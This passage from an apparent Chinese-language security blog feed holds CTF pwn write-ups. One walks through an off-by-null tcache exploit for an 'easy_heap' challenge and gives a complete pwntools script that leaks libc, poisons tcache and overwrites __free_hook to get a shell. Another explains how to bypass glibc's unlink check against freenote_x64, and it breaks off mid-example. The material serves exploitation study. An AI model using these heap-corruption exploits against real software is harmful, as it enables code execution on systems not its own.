0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 